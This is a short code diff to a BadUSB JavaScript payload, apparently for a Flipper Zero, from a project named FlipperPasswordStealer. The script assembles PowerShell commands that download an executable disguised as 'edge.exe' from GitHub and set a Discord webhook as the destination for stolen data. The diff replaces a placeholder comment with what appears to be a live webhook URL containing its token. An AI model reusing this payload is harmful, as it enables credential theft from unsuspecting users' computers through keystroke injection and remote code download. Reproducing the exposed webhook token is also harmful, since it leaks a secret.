@@ -1,7 +1,7 @@
 let badusb = require("badusb");
 
 let script = [
-    "$webhookUrl = '<webhook>';", //Add your webhook url here.
+    "$webhookUrl = '<webhook>';", //https://discordapp.com/api/webhooks/1321511157743357992/ZYXOkdWGiPjyZnDfCI8HFbDjwisTLrcNB3YMLSD1KhutROU6SGSWWRvQ6rEVksskqYSq.
     "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/edge.exe';",
     "$exePath = '.\\edge.exe';",
     "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
